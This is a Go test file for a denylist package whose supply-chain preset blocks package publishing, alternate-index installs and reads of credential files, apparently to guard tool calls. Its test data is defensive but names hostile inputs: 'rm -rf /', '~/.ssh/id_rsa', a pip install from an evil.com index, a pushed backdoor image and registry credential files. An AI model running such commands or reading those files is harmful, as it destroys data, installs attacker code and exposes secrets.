package denylist

import (
	"strings"
	"testing"
)

func TestLoadPreset_SupplyChain(t *testing.T) {
	p, err := LoadPreset("supply-chain")
	if err != nil {
		t.Fatalf("LoadPreset failed: %v", err)
	}

	if len(p.URLs) == 0 {
		t.Error("supply-chain preset has no URL patterns")
	}
	if len(p.Files) == 0 {
		t.Error("supply-chain preset has no file patterns")
	}
	if len(p.Commands) == 0 {
		t.Error("supply-chain preset has no command patterns")
	}

	// Verify key supply chain patterns exist.
	wantURLs := []string{"registry.npmjs.org", "upload.pypi.org", "crates.io"}
	for _, want := range wantURLs {
		found := false
		for _, u := range p.URLs {
			if strings.Contains(u, want) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("missing URL pattern containing %q", want)
		}
	}

	wantCommands := []string{"npm publish", "pip install --index-url", "cargo publish", "docker push"}
	for _, want := range wantCommands {
		found := false
		for _, c := range p.Commands {
			if strings.Contains(c, want) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("missing command pattern containing %q", want)
		}
	}

	wantFiles := []string{".npmrc", ".pypirc", ".cargo/config.toml"}
	for _, want := range wantFiles {
		found := false
		for _, f := range p.Files {
			if strings.Contains(f, want) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("missing file pattern containing %q", want)
		}
	}
}

func TestLoadPreset_Unknown(t *testing.T) {
	_, err := LoadPreset("nonexistent")
	if err == nil {
		t.Fatal("expected error for unknown preset")
	}
	if !strings.Contains(err.Error(), "unknown preset") {
		t.Errorf("unexpected error: %v", err)
	}
}

func TestListPresets(t *testing.T) {
	presets := ListPresets()
	if len(presets) == 0 {
		t.Fatal("no presets found")
	}

	found := false
	for _, name := range presets {
		if name == "supply-chain" {
			found = true
		}
	}
	if !found {
		t.Errorf("supply-chain not in preset list: %v", presets)
	}
}

func TestMerge_CombinesPatterns(t *testing.T) {
	base := Patterns{
		URLs:     []string{"a.com", "b.com"},
		Files:    []string{"~/.ssh/id_rsa"},
		Commands: []string{"rm -rf /"},
	}
	overlay := Patterns{
		URLs:     []string{"c.com", "a.com"}, // a.com is duplicate
		Files:    []string{"**/.env"},
		Commands: []string{"npm publish", "rm -rf /"}, // rm -rf / is duplicate
	}

	merged := Merge(base, overlay)

	// Check URLs merged and deduped.
	if len(merged.URLs) != 3 {
		t.Errorf("URLs: got %d, want 3: %v", len(merged.URLs), merged.URLs)
	}

	// Check Files merged.
	if len(merged.Files) != 2 {
		t.Errorf("Files: got %d, want 2: %v", len(merged.Files), merged.Files)
	}

	// Check Commands merged and deduped.
	if len(merged.Commands) != 2 {
		t.Errorf("Commands: got %d, want 2: %v", len(merged.Commands), merged.Commands)
	}
}

func TestMerge_EmptyOverlay(t *testing.T) {
	base := Patterns{
		URLs:     []string{"a.com"},
		Files:    []string{"~/.ssh/id_rsa"},
		Commands: []string{"rm -rf /"},
	}
	empty := Patterns{}

	merged := Merge(base, empty)
	if len(merged.URLs) != 1 || len(merged.Files) != 1 || len(merged.Commands) != 1 {
		t.Errorf("merge with empty changed counts: URLs=%d Files=%d Commands=%d",
			len(merged.URLs), len(merged.Files), len(merged.Commands))
	}
}

func TestMerge_EmptyBase(t *testing.T) {
	empty := Patterns{}
	overlay := Patterns{
		URLs:     []string{"a.com"},
		Commands: []string{"npm publish"},
	}

	merged := Merge(empty, overlay)
	if len(merged.URLs) != 1 || len(merged.Commands) != 1 {
		t.Errorf("merge into empty failed: URLs=%d Commands=%d",
			len(merged.URLs), len(merged.Commands))
	}
}

func TestMerge_PreservesOrder(t *testing.T) {
	base := Patterns{URLs: []string{"first", "second"}}
	overlay := Patterns{URLs: []string{"third", "first"}} // first is dup

	merged := Merge(base, overlay)
	want := []string{"first", "second", "third"}
	if len(merged.URLs) != len(want) {
		t.Fatalf("URLs count: got %d, want %d", len(merged.URLs), len(want))
	}
	for i, got := range merged.URLs {
		if got != want[i] {
			t.Errorf("URLs[%d]: got %q, want %q", i, got, want[i])
		}
	}
}

func TestSupplyChainPreset_BlocksRealAttacks(t *testing.T) {
	preset, err := LoadPreset("supply-chain")
	if err != nil {
		t.Fatalf("LoadPreset: %v", err)
	}

	merged := Merge(DefaultPatterns, preset)
	dl := New(merged)

	tests := []struct {
		resource  string
		tool      string
		wantBlock bool
		desc      string
	}{
		// Supply chain attacks that MUST be blocked.
		{"npm publish @scope/malicious", "shell", true, "npm publish to registry"},
		{"pip install --index-url http://evil.com/simple pkg", "exec", true, "pip alternate index"},
		{"docker push evil/backdoor:latest", "command", true, "docker push image"},
		{"twine upload dist/*", "shell", true, "twine upload to PyPI"},
		{"cargo publish --token abc", "exec", true, "cargo publish crate"},
		// File access that MUST be blocked.
		{"~/.npmrc", "file", true, "npmrc credential file"},
		{"~/.pypirc", "file", true, "pypirc credential file"},
		{"/home/user/.cargo/config.toml", "file", true, "cargo config file"},
		// Legitimate operations that should NOT be blocked.
		{"npm install express", "shell", false, "normal npm install"},
		{"pip install requests", "exec", false, "normal pip install"},
		{"cargo build --release", "command", false, "normal cargo build"},
	}

	for _, tt := range tests {
		blocked, reason := dl.IsBlocked(tt.resource, tt.tool)
		if blocked != tt.wantBlock {
			if tt.wantBlock {
				t.Errorf("%s: want blocked, got allowed", tt.desc)
			} else {
				t.Errorf("%s: want allowed, got blocked (%s)", tt.desc, reason)
			}
		}
	}
}
